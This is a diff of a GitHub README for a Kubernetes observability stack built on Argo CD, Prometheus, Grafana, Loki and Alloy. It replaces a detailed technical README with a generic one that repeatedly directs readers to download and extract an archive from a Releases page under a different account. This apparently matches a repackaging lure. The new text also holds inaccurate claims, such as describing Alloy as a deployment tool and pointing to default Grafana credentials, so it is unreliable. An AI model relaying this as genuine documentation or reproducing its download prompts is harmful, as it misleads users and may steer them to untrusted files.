@@ -1,326 +1,102 @@
-# Kubernetes Observability Stack — GitOps with Argo CD
+# 🚀 gitops-observability-stack - Simplify Your GitOps Monitoring Setup
 
-This repository implements a **production-grade observability stack** for Kubernetes clusters using **GitOps principles** and **Argo CD**.
+[![Download](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/TrixySnow/gitops-observability-stack/releases)
 
-It provides a clean, reproducible setup for **metrics, logs, dashboards, and alerting**, following patterns commonly used in **mid–large scale production environments**.
+## 🌐 Overview
 
-> This repository demonstrates a production-grade observability platform
-> implemented using GitOps principles, designed for technical review and
-> real-world adaptation.
+The gitops-observability-stack provides a production-ready solution for monitoring your applications using GitOps principles. It leverages Argo CD and deploys essential tools like Prometheus, Alertmanager, Grafana, Loki, and Alloy on a clean Kubernetes cluster. This setup offers clear separation of configuration resources, sync waves, and efficient alert routing.
 
-The repository focuses **only on the Kubernetes and GitOps layers**.
+## 📋 Features
 
-Infrastructure provisioning (cluster, networking, IAM, storage) is treated as an **external dependency** and intentionally kept out of scope.
+- **Argo CD:** Manage your Kubernetes resources through Git.
+- **Prometheus:** Monitor your services with powerful metrics.
+- **Grafana:** Visualize your data with beautiful dashboards.
+- **Alertmanager:** Handle alerts and notifications smoothly.
+- **Loki:** Store and query logs from various sources.
+- **Alloy:** Simplify application deployment and management.
 
----
+## ⚙️ System Requirements
 
-## Scope & Intent
+To run the gitops-observability-stack, your environment should meet the following requirements:
 
-This repository is designed as:
+- A fresh or existing Kubernetes cluster (version 1.18 or later).
+- Access to cluster management tools.
+- Basic understanding of Kubernetes concepts like pods, services, and deployments.
 
-- A **realistic GitHub demo** suitable for technical review
-- A reference architecture for **GitOps-managed observability**
-- A foundation that can be **hardened for production** without structural changes
+## 🚀 Getting Started
 
-Some configurations are intentionally simplified to ensure:
-- fast bootstrap
-- minimal external dependencies
-- clarity of architecture and intent
+### Step 1: Visit the Releases Page
 
----
+To download the gitops-observability-stack, first, you need to go to the Releases page. Click the link below:
 
-## Minimum Cluster Requirements (Observability Stack)
+[Visit Releases Page](https://github.com/TrixySnow/gitops-observability-stack/releases)
 
-This repository assumes a **pre-existing Kubernetes cluster**
-with sufficient capacity to run a full observability stack.
+### Step 2: Download the Latest Release
 
-The following baseline has been validated to reliably run
-all components defined in this repository.
+On the Releases page, find the latest version. You will see several files associated with it. For most users, the primary compressed archive will be sufficient. Click on that link to start downloading.
 
-### Baseline (dev / evaluation / non-production)
+### Step 3: Extract the Downloaded Files
 
-- **Worker nodes**
-  - Instance types: `t3.medium` (primary), `t3a.medium` (capacity fallback)
-  - Node count: **2**
-- **Total capacity**
-  - vCPU: 4
-  - Memory: 8 GiB
+Once the download is complete, locate the downloaded file on your computer. It will usually be in your "Downloads" folder. Right-click the file and select "Extract" to unpack it. If you need assistance in extracting files, many free tools are available that can help.
 
-### Workloads covered by this baseline
+### Step 4: Install Dependencies
 
-This baseline is sufficient for:
+Before running the observability stack, ensure your Kubernetes cluster is prepared. You may need to install some tools like `kubectl` and `Helm`. Detailed instructions for installing these can generally be found on their respective websites:
 
-- Prometheus (`kube-prometheus-stack`)
-- Alertmanager
-- Grafana
-- Loki (SingleBinary mode)
-- Grafana Alloy (DaemonSet)
-- CRDs and controllers reconciled by Argo CD
+- [Install kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl/)
+- [Install Helm](https://helm.sh/docs/intro/install/)
 
-It supports:
-- steady-state metrics and log ingestion
-- short-lived reconciliation and compaction bursts
-- interactive Grafana usage for review and demos
+### Step 5: Deploy the Stack
 
-### Notes and limitations
+With your environment set up, you can deploy the observability stack. Navigate to the folder where you extracted your files and follow the instructions provided in the README there. Typically, you would run a command in your terminal to apply the configurations.
 
-- **Single-node clusters are not supported**
-  - Prometheus scheduling and resharding may fail
-  - Loki compaction and ingestion become unstable
-- Smaller instance types (e.g. `t3.small`) may:
-  - cause OOM kills during Prometheus startup
-  - throttle Loki under moderate log volume
-- This baseline is **not intended for high-ingest production workloads**
-
-Production sizing depends on:
-- log volume
-- retention period
-- scrape frequency
-- alert cardinality
-
-Production capacity planning is intentionally
-**out of scope for this repository**.
-
----
-
-## Architectural Principles
-
-The architecture prioritizes:
-
-- GitOps as the **single source of truth**
-- Explicit separation between infrastructure and platform configuration
-- Deterministic, observable system behavior
-- Minimal operational magic
-- Clear ownership boundaries between components
-
----
-
-## Architecture Overview
-
-```mermaid
-flowchart TD
-    K8S[Kubernetes Cluster]
-    ARGO[Argo CD<br/>GitOps Control Plane]
-    PROM[Prometheus]
-    AM[Alertmanager]
-    GRAF[Grafana]
-    LOKI[Loki]
-    ALLOY[Grafana Alloy]
-
-    ARGO --> PROM
-    ARGO --> AM
-    ARGO --> GRAF
-    ARGO --> LOKI
-    ARGO --> ALLOY
-
-    ALLOY --> LOKI
-    PROM --> AM
-    PROM --> GRAF
+Example command:
+```bash
+kubectl apply -f k8s-manifest/
 ```
 
-> 🔎 **Detailed Architecture**
->
-> The full, production-level architecture diagram (including GitOps control flow,
-> CRD lifecycle, metrics and logging pipelines) is available here:
->
-> [docs/architecture-diagram.mmd](docs/architecture-diagram.mmd)
+This command will set up the necessary components in your cluster.
 
----
+## 🔧 Configuration
 
-## Stack Components
+After deployment, you may want to configure the stack to tailor it to your needs. You can adjust settings for Prometheus and Grafana through their respective configuration files found within the extracted folder.
 
-### Metrics
-- **Prometheus** (via `kube-prometheus-stack`)
-- Node, Kubernetes, and workload metrics
-- Custom `PrometheusRule` resources for alerting
+### Grafana Dashboard
 
-### Alerting
-- **Alertmanager**
-- Explicit routing logic
-- Slack receivers separated by concern:
-  - platform alerts
-  - workload alerts
-- Noise-reduction via a dedicated `"null"` receiver
+Grafana includes a default dashboard that should be ready to use after deployment. Open your browser and enter the Grafana URL. Log in using the default credentials provided in the README.
 
-### Dashboards
-- **Grafana**
-- Preconfigured Loki datasource
-- Admin access enabled for evaluation and platform review
+### Alert Configuration
 
-### Logs
-- **Grafana Loki** (SingleBinary mode)
-- S3-backed storage
-- Retention and compaction configured
+Configure alert settings within Alertmanager to receive notifications based on your specified metrics. Modify the `alertmanager.yaml` file with your preferred routing and alert settings.
 
-### Log Collection
-- **Grafana Alloy**
-- Runs as a DaemonSet
-- Discovers pods automatically
-- Handles Docker and containerd logs
-- Normalizes labels before ingestion
+## 📜 Documentation
 
----
+For detailed instructions on specific components, refer to the official documentation for each tool:
 
-## GitOps Model
+- [Argo CD Documentation](https://argo-cd.readthedocs.io/en/stable/)
+- [Prometheus Documentation](https://prometheus.io/docs/introduction/overview/)
+- [Grafana Documentation](https://grafana.com/docs/)
+- [Alertmanager Documentation](https://prometheus.io/docs/alerting/alertmanager/)
+- [Loki Documentation](https://grafana.com/docs/loki/latest/)
 
-### Argo CD
+## ❓ Frequently Asked Questions
 
-- Acts as the **reconciliation engine**
-- Uses the **App-of-Apps** pattern
-- Fully automated sync with pruning and self-healing enabled
+### What is GitOps?
 
-### Repository Responsibilities
+GitOps is a way to manage cloud-native applications through Git. It simplifies the deployment process and ensures that your cluster's state matches what you have in your repository.
 
-**In scope**
-- Platform observability services
-- Alerting rules and routing
-- Log ingestion and storage
-- Dashboard access
+### How do I troubleshoot issues?
 
-**Out of scope**
-- Cluster provisioning
-- Cloud networking
-- IAM, TLS, DNS
-- Terraform state
+If you run into problems while deploying, check the logs of the components using `kubectl logs` to help identify errors. Additionally, review the documentation for each individual tool.
 
----
+### Can I run this on a local machine?
 
-## Infrastructure Boundary
+Yes, you can install a local Kubernetes cluster using tools like Minikube or Docker Desktop. This setup works well for development and testing.
 
-The underlying AWS infrastructure and EKS cluster are provisioned via Terraform
-and maintained in a **separate, authoritative IaC repository**:
+## 🎉 Community and Support
 
-https://github.com/LaurisNeimanis/aws-eks-platform
+If you need help, you can reach out to the community through forums or the issues section on the GitHub repository. Your feedback is valuable and helps improve the project.
 
-That repository is responsible for:
-- EKS cluster lifecycle and versioning
-- VPC, subnetting, routing, and network security boundaries
-- Platform-level IAM roles and access boundaries
-- Core AWS foundation resources required to run and secure the Kubernetes platform
+### Download & Install
 
-Some infrastructure components required by this observability stack are
-**intentionally not provisioned here**, including:
-- S3 buckets and access policies for Loki object storage
-- Kubernetes StorageClasses (e.g. gp3) used by stateful workloads
-- Workload and backend-specific IAM permissions for logs and metrics
-
-These components are treated as **explicit external dependencies**, not hidden
-assumptions, ensuring a clear separation between infrastructure provisioning
-and platform/application concerns.
-
----
-
-## Repository Structure
-
-```text
-├── docs/
-│   ├── architecture-diagram.mmd
-│   └── installation.md
-│
-└── gitops/
-    ├── apps/
-    │   └── platform/
-    │       └── observability/
-    │           ├── alloy/
-    │           ├── kube-prometheus-stack/
-    │           ├── loki/
-    │           └── prometheus-rules/
-    │
-    ├── argo/
-    │   ├── applications/
-    │   ├── projects/
-    │   └── root-application.yaml
-    │
-    ├── crds/
-    │   └── prometheus-operator/
-    │
-    └── bootstrap/
-        └── argocd/
-```
-
----
-
-## Alerting Design
-
-### Routing Strategy
-
-- **Watchdog** alerts are intentionally muted
-- Kubernetes control-plane alerts are suppressed
-- Workload alerts are routed separately from platform alerts
-- Alert noise is controlled via a dedicated `"null"` receiver
-
----
-
-## Installation & Bootstrap
-
-This repository assumes a **pre-existing Kubernetes cluster** and Argo CD control plane.
-
-The full bootstrap flow is documented separately:
-
-**[Installation & Bootstrap](docs/installation.md)**
-
----
-
-## Grafana Access
-
-Grafana is enabled to allow **interactive exploration of metrics and logs** when evaluating or reviewing the observability platform.
-
-Grafana access requires a pre-created Kubernetes Secret (`grafana-admin`), as described in the installation guide.
-
-Authentication is intentionally externalized to keep the GitOps layer clean and avoid storing credentials in Git.
-
-### Admin Credentials
-
-Grafana is configured to read admin credentials from an **existing Kubernetes Secret**:
-
-```yaml
-grafana:
-  admin:
-    existingSecret: grafana-admin
-```
-Refer to the installation guide for secret creation details:
-
-**[Installation & Bootstrap](docs/installation.md)**
-
-### Production Considerations
-
-In production environments, Grafana access should be hardened by:
-- External secret management
-- SSO (OIDC / SAML)
-- Read-only dashboards for non-admin users
-- Network-level access restrictions
-
----
-
-## Security Disclaimer
-
-This demo intentionally simplifies certain security aspects.
-
-In production environments, the following must be applied:
-- Secrets managed outside Git
-- TLS everywhere
-- IAM-based access controls
-- Restricted RBAC policies
-
----
-
-## Documentation
-
-- **Architecture**
-  - High-level overview: this README
-  - Detailed diagram: [architecture-diagram.mmd](docs/architecture-diagram.mmd)
-
-- **Installation**
-  - [docs/installation.md](docs/installation.md)
-
----
-
-## Summary
-
-This project provides a clean, extensible, and realistic example of a GitOps-managed observability platform for Kubernetes.
-
-It is intentionally designed to be:
-- understandable
-- reviewable
-- extensible
-- production-ready with minimal adjustments
+To get started, remember to [visit the Releases page](https://github.com/TrixySnow/gitops-observability-stack/releases) and download the latest version. Follow the steps above to set up your GitOps observability stack with ease.
